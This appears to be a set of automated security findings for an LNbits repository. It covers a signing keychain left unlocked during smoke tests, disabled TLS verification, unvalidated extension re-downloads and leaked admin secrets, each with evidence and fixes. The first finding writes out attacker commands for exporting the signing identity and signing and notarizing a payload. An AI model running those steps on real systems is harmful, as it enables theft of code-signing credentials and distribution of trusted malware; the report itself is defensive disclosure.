# macOS release runs full product smoke tests while Developer ID keychain and notary credentials stay unlocked

## Details
`macos/release.py:release()` performs signing, notarization and stapling of both `LNbits.app` and the DMG and then, before the signing session is torn down, calls `verify_image()` (release.py:159-165, still inside the `cleanup_on_exit(session.cleanup)` block opened at :115). `verify.py:128-151` mounts the final image and *executes the product*: `smoke_sidecars.py` runs the bundled Node with `supervisor.mjs spark`, which imports `spark/server.mjs` and the whole Spark SDK dependency tree; `smoke.py` starts the complete packaged LNbits server (every Python dependency in uv.lock, Wasmtime, etc.); `smoke_launcher.py` drives the Tk launcher. All of this runs unsandboxed as the same CI user while:

- the temporary keychain holding the Developer ID Application private key is unlocked, has a 6-hour auto-lock (`set-keychain-settings -lut 21600`) and is first in the user's keychain search list (credentials.py:134-160); keychain lock state is per user session, not per process;
- the key was imported extractable (no `-x`) with `-T /usr/bin/codesign -T /usr/bin/security` and the partition list `apple-tool:,apple:,codesign:` (credentials.py:162-188), which is exactly what lets *any* codesign/security process of that user use the key with no prompt;
- the notarytool credentials (Apple ID, team ID, app-specific password) are stored in that keychain under the fixed profile name `lnbits-notarization` (credentials.py:199-213).

The only isolation applied to the smoke subprocesses is `clean_environment()` (common.py:53-59), which strips the six credential *environment variables*; it cannot cover a keychain. The README states the security intent twice: the release 'removes all six variables from frontend, dependency, PyInstaller, and smoke-test subprocess environments' (macos/README.md:100-102) and 'Credentials are scoped to the signed build step' (:253-256). Every other third-party-code execution (prepare, unit tests, PyInstaller build in `build_application`) indeed runs before `session.setup()`; the final-image smoke checks are the one third-party execution left inside the credentialed window.

Attack path (the threat model's 'compromised dependency reaching credentialed workflows' adversary): malicious code in a pinned runtime dependency executed by the smoke checks (an npm package in the Spark sidecar's lockfile, or a Python package in uv.lock imported by the packaged server) runs `security list-keychains` to find `.../lnbits-release-*/signing.keychain-db` (or simply relies on it being first in the search list), then `codesign --force --sign <fingerprint> --options runtime --timestamp <payload>` and `xcrun notarytool submit <payload> --keychain <path> --keychain-profile lnbits-notarization`, or `security export -k <path> -t identities -f pkcs12` to extract the identity, and exfiltrates over the runner's internet access. The result is arbitrary software signed and notarized under LNbits' Developer ID — independent of this release, surviving it until certificate revocation — plus the Apple ID app-specific password. This is strictly more than the project concedes to a shipped dependency (running inside the signed LNbits.app): it is use and extraction of the signing identity itself.

Assumptions (macOS platform behaviour, not a pinned dependency): `security unlock-keychain` state is visible to all processes of the user; `-T` ACL entries plus the `apple-tool:,apple:,codesign:` partition list allow unattended use by `/usr/bin/codesign` and `/usr/bin/security` from any process; a P12 imported without `-x` is exportable. This is the standard CI signing recipe and is what makes the pipeline's own unattended codesign work.

Precondition: the malicious code must be in the pinned versions themselves (lockfile integrity hashes prevent substituting a different artifact), so this requires an upstream package compromise or malicious maintainer whose release LNbits then pins — outside the attacker's control, hence AT:PRESENT. Note that because smoke checks share the job VM with earlier steps, a daemonised process spawned by third-party code earlier in the job could equally wait for the keychain to appear; a robust fix therefore isolates smoke execution in a separate uncredentialed job rather than only reordering within the step.

## Evidence
1. [.github/packaging/macos/release.py:111–165](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.github/packaging/macos/release.py#L111-L165)
   release() opens cleanup_on_exit(session.cleanup) at :115, creates the signing session at :126 (session.setup), signs/notarizes/staples the app (:134-150) and the DMG (:154-158), and only then calls verify_image() at :159-165 while still inside that block. The temporary keychain, its Developer ID private key and the stored notarytool profile are torn down only when the block exits, i.e. after every smoke check has executed. All signing and notarization is complete before :159, so nothing after that point needs the keychain.
2. [.github/packaging/macos/verify.py:128–150](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.github/packaging/macos/verify.py#L128-L150)
   verify_image() executes the mounted product as the same user: smoke_sidecars.py (bundled Node running supervisor.mjs, which imports spark/server.mjs and the Spark SDK node_modules tree), smoke.py (the complete packaged LNbits server with every uv.lock dependency and Wasmtime) and macos/smoke_launcher.py (Tk launcher). This is third-party dependency code running with the CI user's full privileges; no sandbox is applied.
3. [.github/packaging/macos/credentials.py:134–159](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.github/packaging/macos/credentials.py#L134-L159)
   The keychain is unlocked with the password (:134-141), given a 6-hour auto-lock via set-keychain-settings -lut 21600 (:142-149), and prepended to the user's keychain search list (:151-160). Keychain lock state is per user session, not per process, so every process of the CI user finds it unlocked and first in the search path.
4. [.github/packaging/macos/credentials.py:162–188](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.github/packaging/macos/credentials.py#L162-L188)
   The P12 is imported without -x (extractable) with -T /usr/bin/codesign -T /usr/bin/security (:162-175), and the partition list is set to apple-tool:,apple:,codesign: with the password (:178-188) so codesign uses the private key with no prompt. Nothing scopes this to the pipeline's own codesign invocations; any /usr/bin/codesign or /usr/bin/security process of that user is equally authorised.
5. [.github/packaging/macos/credentials.py:199–213](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.github/packaging/macos/credentials.py#L199-L213)
   Apple ID, team ID and app-specific password are stored into the same temporary keychain under the fixed profile name lnbits-notarization (PROFILE :19), usable by `xcrun notarytool submit --keychain <path> --keychain-profile lnbits-notarization` from any process of that user while the keychain exists.
6. [.github/packaging/macos/common.py:53–59](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.github/packaging/macos/common.py#L53-L59)
   clean_environment() is the only isolation applied to Runner subprocesses (and thus to the smoke scripts and everything they spawn): it strips the six credential environment variables plus two override variables. The unlocked keychain and the stored notary profile are not environment variables, so this control does not cover them.
7. [.github/packaging/macos/README.md:100–102](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.github/packaging/macos/README.md#L100-L102)
   Documented security intent: the release process 'removes all six variables from frontend, dependency, PyInstaller, and smoke-test subprocess environments'. Smoke-test subprocesses are explicitly meant to run without the credentials; the keychain-held identity and notary profile are the credentials that escape that scoping.
8. [.github/packaging/macos/README.md:253–256](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.github/packaging/macos/README.md#L253-L256)
   'Credentials are scoped to the signed build step. Dependency preparation and launcher/packaging tests run separately without them.' The maintainers deliberately moved every other third-party-code execution (prepare, unit tests, PyInstaller build) before session.setup(); the final-image smoke checks are the one third-party execution left inside the credentialed window.
9. [.github/workflows/macos.yml:73–84](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/.github/workflows/macos.yml#L73-L84)
   The stable and RC release workflows (release.yml:102-114, release-rc.yml:91-103) call this job with the six Apple secrets; the credentialed step runs release.py --ci --prepared on a GitHub-hosted macOS runner with internet access, so the smoke subprocesses can both use the keychain and exfiltrate. The always() cleanup step runs only afterwards.

## Impact
The release pipeline's Developer ID private key and Apple notarization credentials become usable (and, assuming an extractable imported key, exportable) by attacker code: full loss of confidentiality of the signing material and full loss of integrity of the project's code-signing guarantee. No availability impact on the pipeline. Subsequent-system impact: Arbitrary binaries signed and notarized under LNbits' Developer ID pass Gatekeeper on every macOS user's machine and carry the project's identity, enabling distribution of trusted malware beyond this release (integrity and confidentiality of end users' systems).

## Reproduction steps
1. Attacker: author of malicious code inside a dependency that LNbits pins (npm package used by the Spark sidecar, or a Python package of the server), published remotely. Delivery: the stable/RC release workflow runs release.py --ci; after notarization, verify_image() executes the packaged product and thus the attacker's code as the CI user. The code locates the unlocked temporary keychain, signs/notarizes its own payload with the project's Developer ID via unattended codesign/notarytool, or exports the identity. Requires the malicious version to be the pinned one (AT:PRESENT); no privileges on LNbits infrastructure and no human interaction.

## Recommended fix
1. The signing session (unlocked keychain with unattended-codesign ACL and stored notarytool profile) outlives the signing/notarization/stapling steps and is still present when the pipeline executes the packaged product and its third-party dependencies in the final-image smoke checks; environment-variable scrubbing does not cover keychain-held credentials. Fix criteria: No third-party or product code executes while the Developer ID identity or notarization profile is usable: either delete the temporary keychain (and notary profile) and restore the search list before any smoke check runs — all signing, notarization and stapling are complete at release.py:158 — or run the final-image smoke checks in a separate job/VM that never receives the Apple secrets, consuming the uploaded artifact. Verify that during smoke execution `security find-identity -v -p codesigning` lists no Developer ID identity and `xcrun notarytool history --keychain-profile lnbits-notarization` fails; keep cleanup as a publication gate.
2. The imported private key is extractable and usable by any codesign/security invocation of the CI user, not only the pipeline's own, for the full 6-hour auto-lock window. Fix criteria: Import the identity non-extractable (`security import -x`), lock the keychain between the pipeline's own signing calls (or reduce the auto-lock to the signing window), and confirm that `security export` of the identity fails and that a codesign from an unrelated process cannot use the key once signing has finished.

---
**Severity:** CRITICAL
**Status:** Open
**Category:** Insufficiently protected credentials
**CWE:** [CWE-522](https://cwe.mitre.org/data/definitions/522.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257559

---

# CoreLightningRest backend disables TLS certificate verification unless a cert path is set

## Details
CoreLightningRestWallet builds its HTTP client as `self.cert = settings.corelightning_rest_cert or False; httpx.AsyncClient(verify=self.cert, headers=headers)` (lnbits/wallets/corelightningrest.py:65-66). When CORELIGHTNING_REST_URL is an https:// endpoint and CORELIGHTNING_REST_CERT is unset, `verify` is the literal `False`, which in the pinned httpx 0.27.2 disables certificate-chain and hostname verification entirely. Nothing enforces or warns about the missing cert: the constructor raises only for a missing URL or macaroon (:29-44); docs/guide/wallets.md:117-122 lists the cert under a '**Required env vars**' heading that is the same boilerplate used for every backend in that file (including LND REST at :177-181, whose code treats the cert as optional), with an http:// example URL for which the cert is meaningless; the admin UI labels the field simply 'Certificate' (lnbits-admin-funding-sources.js:79). The sibling backends show the intended posture: LndRestWallet falls back to `verify=True` and logs a warning (lndrest.py:81-90), CLNRestWallet refuses to start without a CA (clnrest.py:573-580). An operator whose node presents a publicly issued certificate — the case LndRest's own warning anticipates — therefore gets no verification at all here.

Every request on this client carries the c-lightning-REST `macaroon` header (:46-52); c-lightning-REST issues a single access.macaroon authorising every endpoint including /v1/pay and /v1/withdraw. An attacker on the LNbits→node path (hostile LAN/VPN/overlay hop, router, DNS or BGP hijack of a remote node) terminates TLS with any certificate, reads the macaroon from the first status() poll, and may forward or forge responses. Forged bodies flow straight into the ledger: `check_payment_status` (payments.py:725-729) calls get_invoice_status/get_payment_status (:242-283), and `update_pending_payment` (payments.py:422-438) calls `update_payment_success_status` on `status.success` — so `{"invoices":[{"status":"paid"}]}` for an unpaid invoice credits the wallet with no inbound payment, and `{"pays":[{"status":"failed"}]}` for a settled payment marks it FAILED and refunds the sender while the sats are gone. paid_invoices_stream (:285-322) likewise yields any payment_hash the peer returns.

The funding backend is trusted by design as the money source of truth, but this code extends that trust to anyone on the wire whenever the node is reached over https without a pinned cert file. Holds only in that deployment: plaintext http:// URLs (the documented local example) are unaffected by this verify setting, and a deployment that does set CORELIGHTNING_REST_CERT pins the node's certificate.

## Evidence
1. [lnbits/wallets/corelightningrest.py:65–66](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/corelightningrest.py#L65-L66)
   self.cert = settings.corelightning_rest_cert or False; httpx.AsyncClient(verify=self.cert, ...) — with the setting unset, verify is the literal False and httpx 0.27.2 accepts any server certificate on every https connection to the node.
2. [lnbits/wallets/corelightningrest.py:46–52](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/corelightningrest.py#L46-L52)
   The all-endpoint c-lightning-REST access macaroon is attached as a plain 'macaroon' header to every request on this unverified client, so a TLS-terminating impostor reads it on the first status() poll.
3. [lnbits/wallets/corelightningrest.py:242–283](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/corelightningrest.py#L242-L283)
   get_invoice_status/get_payment_status take 'paid'/'complete'/'failed' truth from whatever the peer answers on this connection, with no further check.
4. [lnbits/core/services/payments.py:422–437](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L422-L437)
   update_pending_payment applies the backend's answer directly: status.failed marks the payment FAILED (refund), status.success calls update_payment_success_status (credit) — the forged response becomes ledger state.
5. [lnbits/wallets/lndrest.py:81–90](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/wallets/lndrest.py#L81-L90)
   Sibling backend shows the project's intended posture: with no cert configured LndRestWallet warns and uses verify=True, still validating the chain rather than disabling verification.

## Impact
Confidentiality: the node's all-endpoint REST macaroon is exposed. Integrity: forged invoice/payment statuses credit LNbits wallets with no inbound payment or refund settled payments, corrupting the apipayments ledger (payments.py:422-438). Availability: the attacker can also black-hole the backend, secondary to the above. Subsequent-system impact: With the c-lightning-REST access macaroon the attacker drives the operator's Core Lightning node directly, outside LNbits: pay arbitrary invoices, withdraw on-chain funds, close channels.

## Reproduction steps
1. Attacker sits on the network path between LNbits and a remote c-lightning-REST node configured with an https URL and no CORELIGHTNING_REST_CERT. Assumption: httpx 0.27.2 (uv.lock pin) treats verify=False as 'no certificate or hostname verification' and a str as a CA-bundle path, per its public API. They terminate TLS with any certificate, read the macaroon header, and forward or forge responses. No LNbits privileges and no user interaction; the machine-in-the-middle position is the attack requirement (AT:P).

## Recommended fix
1. A missing certificate setting is translated into verify=False, silently removing server authentication for the channel that carries the node credential and payment truth. Fix criteria: With no certificate configured, https connections to the node must still verify the server certificate against the system trust store (as LndRestWallet does) or the backend must refuse to initialise (as CLNRestWallet does); verify that an https URL without a cert setting either validates the chain or fails startup, and that a self-signed impostor certificate is rejected.
2. The insecure fallback is silent: no startup warning or documentation tells the operator that omitting the cert disables verification. Fix criteria: Document the cert's effect for https endpoints and emit a startup warning when it is absent, so the configuration surface no longer presents the unverified mode as a normal option.

---
**Severity:** CRITICAL
**Status:** Open
**Category:** Improper certificate validation
**CWE:** [CWE-295](https://cwe.mitre.org/data/definitions/295.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** HIGH
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257519

---

# Startup extension restore re-downloads and executes archives without type validation or hash

## Details
LNbits persists installed-extension metadata in `installed_extensions` and, on every startup, `check_installed_extensions()` (app.py:280-309) re-creates any extension whose files are gone (the docstring: 'Zips that are missing will be re-downloaded'; regression test tests/unit/test_app_check_installed_extension_files.py exercises the download branch). `check_installed_extension_files()` (app.py:398-414) downloads `installed_release.archive_url` when `data/zips/<id>.zip` is missing and then extracts based solely on the `extension_type` found inside the freshly downloaded archive: `extension_type == 'wasm'` goes to `data/wasm_extensions/<id>`, anything else goes via `extract_archive()` into the Python-importable `lnbits/extensions/<id>`. Unlike the admin install path (`install_extension`, services/extensions.py:213-233) it never calls `validate_archive()` (which rejects a non-WASM archive for a WASM-manifest release and any .py/.pyc/.so/.pyd member in a WASM package) nor `validate_wasm_extension_permissions()`. `restore_installed_extension()` (app.py:417-427) then calls `register_ext_routes()`, which `importlib.import_module()`s `lnbits.extensions.<id>` (app.py:501-525) — the attacker's Python runs in-process.

Two further facts make the install-time control unrecoverable at restore time. (1) `ExtensionRelease.manifest_type` is declared `Field(default=None, exclude=True)` (models/extensions.py:359); `db.insert/update` serialise via `model.dict()` (db.py:666-690, pydantic~=1.10), so the manifest type the admin installed from is never written to `installed_extensions.meta` — a DB-restored record always has `manifest_type=None` and even a call to `validate_archive()` would skip both type checks. (2) `download_archive()` (models/extensions.py:613-622) verifies sha256 only when `installed_release.hash` is truthy; `ExtensionRelease.from_github_release()` (:407-420) sets no hash, so every release installed from a manifest `repos` entry (GitHub releases, the normal case for both the Python manifest and the default WASM manifest `lnbits/lnbits-extensions-wasm`) is persisted with `hash=None`, and an explicit release may carry `hash: ""` which also skips the check. Integrity rests entirely on what the archive URL serves at restart time.

Resulting path: the admin installs a WASM extension (sandboxed by design; docs/wasm-extensions.md:516-521 promise WASM packages stay out of importable directories and that the installer rejects Python files). The repository owner later re-points the release tag behind the persisted `zipball_url` (or the archive host swaps content) so the zip is a Python extension (no `extension_type: wasm`, an `__init__.py` exporting `<id>_ext`). On the next start where `data/wasm_extensions/<id>` and `data/zips/<id>.zip` are absent but the `installed_extensions` row survives (PostgreSQL-backed instance whose data folder was recreated or migrated without the zips, zips pruned by the operator), the archive is downloaded unverified, `extract_archive()` copies it into `lnbits/extensions/<id>`, and `register_ext_routes()` imports it with full access to the funding-source credentials, `auth_secret_key`, wallet keys and the DB. No admin action or approval occurs; the admin only ever approved a sandboxed WASM module.

The same sink is reached without any file loss through `LNBITS_EXTENSIONS_DEFAULT_INSTALL` (app.py:363-383): for each listed id not yet installed, the newest compatible release from any manifest source (Python or WASM) becomes `installed_release` in memory and flows into `check_installed_extension_files()` → download → type-dispatch → import, again without `validate_archive()`; a WASM-manifest id listed there executes whatever Python the release serves.

For Python-manifest extensions the missing hash merely lets the repo owner replace code at restore time, which stays within the 'installed Python extensions are trusted' design; the defect is the WASM→Python escalation enabled by the absent type check, the unpersisted manifest type and the absent integrity check.

## Evidence
1. [lnbits/app.py:398–414](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/app.py#L398-L414)
   check_installed_extension_files(): when the WASM dir and ext dir are missing it calls download_archive() if the zip is absent, then dispatches on the downloaded archive's own config.json 'extension_type' to extract_wasm_archive() or extract_archive(). It never calls validate_archive() or validate_wasm_extension_permissions(), so a release the admin approved as WASM is extracted as Python whenever the archive now says so.
2. [lnbits/app.py:417–427](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/app.py#L417-L427)
   restore_installed_extension() marks the extension active, builds Extension.from_installable_ext (is_wasm is False because no WASM dir exists after extract_archive) and calls register_ext_routes(), which importlib.import_module()s lnbits.extensions/<id> (app.py:501-525), executing the freshly downloaded code in-process.
3. [lnbits/core/models/extensions.py:592–622](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/extensions.py#L592-L622)
   download_archive() fetches installed_release.archive_url and compares sha256 only when installed_release.hash is truthy; None or '' means any content served at the URL is accepted.
4. [lnbits/core/models/extensions.py:407–420](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/extensions.py#L407-L420)
   from_github_release() constructs ExtensionRelease with no hash, so every GitHub-release install (manifest 'repos' entries, used by both the Python and the default WASM manifest) is persisted with hash=None; the zipball URL is tag-based and can be re-pointed by the repository owner.
5. [lnbits/core/models/extensions.py:359](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/extensions.py#L359)
   manifest_type is Field(exclude=True): pydantic .dict() (used by db.insert/update via model_to_dict, db.py:666-690) drops it, so the manifest type validated at install is never persisted in installed_extensions.meta and cannot be re-checked on a DB-restored record.
6. [lnbits/core/models/extensions.py:640–673](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/extensions.py#L640-L673)
   validate_archive() is the shipped control: it rejects a non-WASM archive for a WASM-manifest release and any .py/.pyc/.pyo/.so/.pyd member in a WASM package. It is only invoked from install_extension(), never from the startup restore path.
7. [lnbits/core/models/extensions.py:675–712](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/extensions.py#L675-L712)
   extract_archive() copies the archive's top-level directory into lnbits/extensions/<id> (the import path) regardless of how the extension was originally installed.
8. [lnbits/core/services/extensions.py:213–233](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/extensions.py#L213-L233)
   For comparison, the admin install path calls validate_archive() and validate_wasm_extension_permissions() between download and extraction; the startup path has no equivalent.
9. [lnbits/app.py:280–308](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/app.py#L280-L308)
   check_installed_extensions() runs the restore for every installed_extensions row (and every LNBITS_EXTENSIONS_DEFAULT_INSTALL id, app.py:363-383) at every server start with no admin involvement; its docstring documents re-downloading missing zips as intended behaviour.

## Impact
Arbitrary Python executes inside the LNbits process via importlib.import_module: full read of settings and secrets (auth_secret_key, funding-source macaroons/runes/API tokens, super_user id, wallet keys), arbitrary DB reads/writes including the apipayments ledger, and the ability to crash or hijack the service. Subsequent-system impact: In-process code holds the funding-source credentials and can issue payments directly against the operator's Lightning node or custodial account, draining funds beyond LNbits' own ledger.

## Reproduction steps
1. Attacker is the owner of the GitHub repository or archive host behind a WASM extension release the admin installed from a configured (default lnbits/lnbits-extensions-wasm or admin-added) WASM manifest; no LNbits credentials are needed and the attacker sends nothing to LNbits — they re-point the release tag or swap the archive content. Exploitation fires automatically on an LNbits restart in which data/wasm_extensions/<id> and data/zips/<id>.zip are both absent while the installed_extensions row persists (PostgreSQL-backed instance with a recreated/migrated data folder, operator-pruned zips), or when the id is listed in LNBITS_EXTENSIONS_DEFAULT_INSTALL on a fresh start — conditions outside the attacker's control, hence AT:PRESENT. No user interaction: the admin approved only the sandboxed WASM module.

## Recommended fix
1. check_installed_extension_files() (and the LNBITS_EXTENSIONS_DEFAULT_INSTALL branch feeding it) extracts a re-downloaded archive based only on the archive's self-declared extension_type, skipping the validate_archive()/permission validation that install_extension() applies, so a release the admin approved as sandboxed WASM can become importable Python code. Fix criteria: Startup restore must apply the same archive validation as install: the archive type must match the type recorded at install, WASM archives must be rejected if they contain Python/native files, and an archive whose type differs from the installed record must be discarded and the extension deactivated rather than imported. Verify by re-pointing an installed WASM release at a Python zip and confirming the restore refuses it and never imports the module.
2. ExtensionRelease.manifest_type is Field(exclude=True), so the manifest type the admin installed from is never persisted in installed_extensions.meta and cannot be enforced on a DB-restored record. Fix criteria: Persist the installed release's manifest/extension type (or an equivalent 'installed as WASM' marker) in the installed_extensions record and require the restore path to honour it. Verify that a record installed from a WASM manifest refuses a non-WASM archive after a process restart.
3. GitHub-release installs are persisted with hash=None (and explicit releases may carry an empty hash), so download_archive() performs no integrity check on re-download. Fix criteria: Record a sha256 of the archive actually installed, for every release type, and require a match on any later re-download; treat a missing or empty hash as a failure rather than a skip. Verify that swapping the content behind an installed GitHub release causes the startup restore to fail with a hash mismatch.

---
**Severity:** CRITICAL
**Status:** Open
**Category:** Download of code without integrity check
**CWE:** [CWE-494](https://cwe.mitre.org/data/definitions/494.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** NONE
**Vulnerable system confidentiality impact:** HIGH
**Vulnerable system integrity impact:** HIGH
**Vulnerable system availability impact:** HIGH
**Subsequent system confidentiality impact:** HIGH
**Subsequent system integrity impact:** HIGH
**Subsequent system availability impact:** LOW
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257384

---

# Admin settings API returns funding-source and provider secrets to every admin user

## Details
GET /admin/api/v1/settings is guarded only by check_admin (admin_api.py:95-100). The handler passes account.is_super_user into get_admin_settings(), but that flag only populates the AdminSettings.is_super_user display field; the body is built from every row of the `core` settings tag (crud/settings.py:35-49, AdminSettings(**row_dict)), and only `super_user` and `auth_all_methods` are stripped. Those rows are seeded at first start by init_admin_settings (services/users.py:213-214) from EditableSettings.from_dict(settings.dict()), so the operator's environment-configured credentials are persisted and returned. AdminSettings subclasses EditableSettings, which includes FundingSourcesSettings in full: LND admin/invoice macaroons, CLN runes, Eclair password, Phoenixd/Boltz/SparkL2 mnemonics, Breez seeds and device keys, Alby/Blink/ZBD/Strike/OpenNode/LNPay API keys, the LNbitsWallet admin key, plus Stripe/PayPal/Square/Revolut secret keys and webhook signing secrets, Google/GitHub/Keycloak/OIDC client secrets, the SMTP password, the Telegram bot token, the Nostr notification private key and the webpush VAPID private key. All are plain `str` fields; the only secret the project masks from this response is lnbits_onchain_master_key (SecretStr, exclude=True, settings.py:1157-1160, asserted absent by tests/api/test_admin_api.py:250).

The project's own design reserves funding-source control to the super user: docs/guide/user_roles.md and super_user.md list 'Change funding source' as super-user only ('the SU is the one trusted with funding source control'), and the admin UI hides the funding-sources panel behind v-if="isSuperUser" (funding.vue:84). The API does not enforce this: any account in lnbits_admin_users (a day-to-day manager per the docs) receives the operator's node credentials with one GET (the admin page's getSettings in admin.js:296 already loads them into every admin's browser). With an LND admin macaroon, CLN pay rune, mnemonic or custodial API key the admin can act directly on the funding node or custodial account, bypassing LNbits' ledger and every per-wallet control; with the fiat webhook signing secrets they can forge provider webhooks. The same fields are also returned by GET /admin/api/v1/settings/default?field_name=<x> (admin_api.py:237-249), which instantiates Settings() from the environment/.env and returns the configured value for any UpdateSettings field.

This crosses the recorded threat model's admin <-> super-user boundary (funding-source credentials and SSO/fiat secrets are listed assets) and contradicts the maintainers' documented role split. The sibling PUT being check_admin is itself an unsanctioned defect, not a concession, and a write path does not disclose the existing secrets in any case.

## Evidence
1. [lnbits/core/views/admin\_api.py:95–100](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/admin_api.py#L95-L100)
   api_get_settings is guarded only by check_admin; account.is_super_user is passed to get_admin_settings solely to fill the AdminSettings.is_super_user display flag, and the whole AdminSettings object is returned to any admin.
2. [lnbits/core/crud/settings.py:35–48](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/settings.py#L35-L48)
   get_admin_settings builds AdminSettings from every row of the core settings tag; only super_user and auth_all_methods are popped, no field is withheld based on is_super_user.
3. [lnbits/core/services/users.py:213–214](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/users.py#L213-L214)
   init_admin_settings copies EditableSettings.from_dict(settings.dict()) — including every environment-configured funding credential — into the system_settings rows at first start (lnbits_admin_ui defaults True), so the DB rows the GET serialises hold the operator's live credentials.
4. [lnbits/settings.py:1556–1558](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L1556-L1558)
   AdminSettings subclasses EditableSettings, so it carries every editable field including all funding-source credential fields.
5. [lnbits/settings.py:792–824](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L792-L824)
   FundingSourcesSettings aggregates every backend's macaroons, runes, API keys, seeds and mnemonics (lines 547-714, all plain `str | None`) and is mixed into EditableSettings at lines 1096-1122.
6. [lnbits/settings.py:1157–1160](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L1157-L1160)
   The only secret the project withholds from this response is lnbits_onchain_master_key (SecretStr, exclude=True; tests/api/test_admin_api.py:250 asserts it is absent from GET settings) — every other credential field is a plain str and is serialised verbatim.
7. [lnbits/settings.py:500–513](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L500-L513)
   SMTP password, Telegram access token and Nostr private key are editable settings included in the response.
8. [lnbits/settings.py:730–785](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L730-L785)
   Stripe/PayPal/Square/Revolut secret keys and webhook signing secrets are editable settings included in the response.
9. [lnbits/settings.py:964–987](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/settings.py#L964-L987)
   Google/GitHub/Keycloak/OIDC client secrets are editable settings included in the response.
10. [lnbits/core/views/admin\_api.py:237–248](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/admin_api.py#L237-L248)
   api_reset_settings (check_admin) instantiates Settings() from env/.env and returns the configured value for any UpdateSettings field, so environment-configured credentials leak by the same route even if the DB copy was changed.
11. [lnbits/decorators.py:422–451](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/decorators.py#L422-L451)
   check_admin admits any lnbits_admin_users member; check_super_user exists and is applied to restart/backup/onchain-key routes but not to the settings read.
